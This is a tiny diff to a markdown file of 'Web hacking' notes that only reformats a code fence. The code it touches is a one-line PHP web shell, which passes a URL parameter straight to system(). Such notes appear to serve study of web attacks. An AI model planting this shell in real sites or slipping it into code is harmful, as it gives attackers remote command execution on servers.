@@ -1,6 +1,7 @@
 # Web hacking
 **Notes**
-```<?php
+```
+<?php
     echo system($_GET["cmd"]);
 ?>
 ```
